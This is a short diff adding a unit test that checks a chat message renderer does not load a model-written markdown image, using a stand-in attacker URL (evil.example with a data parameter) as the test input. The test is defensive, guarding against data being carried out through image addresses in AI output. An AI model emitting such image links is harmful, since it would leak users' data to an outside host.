@@ -99,4 +99,11 @@ describe("MessageBody", () => {
       expect(container.textContent).toContain("$0.2");
     });
   });
+
+  it("does not fetch an image a model writes, which could carry something out in its address", () => {
+    const { container } = render(<MessageBody text={"before ![the chart](https://evil.example/p?d=1) after"} />);
+
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.textContent).toContain("the chart");
+  });
 });
